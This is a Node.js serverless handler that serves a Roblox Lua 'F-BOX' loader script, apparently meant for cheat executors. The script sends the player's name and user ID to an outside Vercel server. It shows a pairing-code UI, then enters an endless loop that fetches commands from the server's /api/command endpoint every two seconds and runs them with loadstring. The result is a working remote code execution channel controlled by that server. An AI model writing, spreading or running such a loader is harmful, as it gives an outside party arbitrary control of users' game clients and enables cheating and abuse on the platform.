const loaderScript = `
-- F-BOX LOADER - UI + COMMAND LOOP
local player = game.Players.LocalPlayer
local SERVER_URL = "https://fbox-alpha.vercel.app"

local function generatePairingCode()
    local letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    local numbers = "0123456789"
    local code = ""
    for i = 1, 3 do
        local rand = math.random(1, #letters)
        code = code .. string.sub(letters, rand, rand)
    end
    code = code .. "-"
    for i = 1, 2 do
        local rand = math.random(1, #numbers)
        code = code .. string.sub(numbers, rand, rand)
    end
    return code
end

local PAIRING_CODE = generatePairingCode()
local LOGIN_URL = SERVER_URL .. "/login.html"

local function copyToClipboard(text)
    local success = pcall(function() setclipboard(text) end)
    return success
end

local function register()
    local data = {
        pairingCode = PAIRING_CODE,
        playerName = player.Name,
        playerId = tostring(player.UserId)
    }
    local jsonData = game:GetService("HttpService"):JSONEncode(data)
    local success, response = pcall(function()
        return request({
            Url = SERVER_URL .. "/api/register",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = jsonData
        })
    end)
    return success and response and response.StatusCode == 200
end

local function getCommand()
    local success, response = pcall(function()
        return request({
            Url = SERVER_URL .. "/api/command",
            Method = "GET"
        })
    end)
    if success and response.StatusCode == 200 then
        return response.Body
    end
    return nil
end

register()

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "FBOX_LoaderUI"
screenGui.Parent = player:WaitForChild("PlayerGui")
screenGui.ResetOnSpawn = false

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 300, 0, 120)
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -60)
mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

local uiStroke = Instance.new("UIStroke")
uiStroke.Thickness = 1.5
uiStroke.Color = Color3.fromRGB(255, 51, 102)
uiStroke.Parent = mainFrame

local uiCorner = Instance.new("UICorner")
uiCorner.CornerRadius = UDim.new(0, 8)
uiCorner.Parent = mainFrame

local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 24, 0, 24)
closeBtn.Position = UDim2.new(1, -28, 0, 4)
closeBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
closeBtn.Text = "✕"
closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
closeBtn.TextScaled = true
closeBtn.Font = Enum.Font.GothamBold
closeBtn.Parent = mainFrame

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(0, 4)
closeCorner.Parent = closeBtn

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -30, 0, 30)
title.Position = UDim2.new(0, 10, 0, 5)
title.BackgroundTransparency = 1
title.Text = "F-BOX"
title.TextColor3 = Color3.fromRGB(255, 51, 102)
title.TextScaled = true
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = mainFrame

local codeBtn = Instance.new("TextButton")
codeBtn.Size = UDim2.new(1, -20, 0, 30)
codeBtn.Position = UDim2.new(0, 10, 0, 40)
codeBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
codeBtn.Text = "📋 " .. PAIRING_CODE
codeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
codeBtn.TextScaled = true
codeBtn.Font = Enum.Font.Gotham
codeBtn.Parent = mainFrame

local codeCorner = Instance.new("UICorner")
codeCorner.CornerRadius = UDim.new(0, 5)
codeCorner.Parent = codeBtn

local urlBtn = Instance.new("TextButton")
urlBtn.Size = UDim2.new(1, -20, 0, 30)
urlBtn.Position = UDim2.new(0, 10, 0, 75)
urlBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
urlBtn.Text = "🔗 Login Page"
urlBtn.TextColor3 = Color3.fromRGB(100, 200, 255)
urlBtn.TextScaled = true
urlBtn.Font = Enum.Font.Gotham
urlBtn.Parent = mainFrame

local urlCorner = Instance.new("UICorner")
urlCorner.CornerRadius = UDim.new(0, 5)
urlCorner.Parent = urlBtn

closeBtn.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

codeBtn.MouseButton1Click:Connect(function()
    if copyToClipboard(PAIRING_CODE) then
        codeBtn.Text = "✅ Copied!"
        wait(1)
        codeBtn.Text = "📋 " .. PAIRING_CODE
    else
        codeBtn.Text = "❌ Failed"
        wait(1)
        codeBtn.Text = "📋 " .. PAIRING_CODE
    end
end)

urlBtn.MouseButton1Click:Connect(function()
    if copyToClipboard(LOGIN_URL) then
        urlBtn.Text = "✅ Copied!"
        wait(1)
        urlBtn.Text = "🔗 Login Page"
    else
        urlBtn.Text = "❌ Failed"
        wait(1)
        urlBtn.Text = "🔗 Login Page"
    end
end)

print("✅ F-BOX Loaded - Code: " .. PAIRING_CODE)

print("📡 Menunggu command...")

while true do
    local command = getCommand()
    
    if command and command ~= "null" then
        print("Command diterima!")
        local func = loadstring(command)
        if func then
            local success = pcall(func)
            print(success and "✅" or "❌")
        end
    end
    
    wait(2)
end
`;

module.exports = (req, res) => {
    res.setHeader('Content-Type', 'text/plain');
    res.send(loaderScript);
};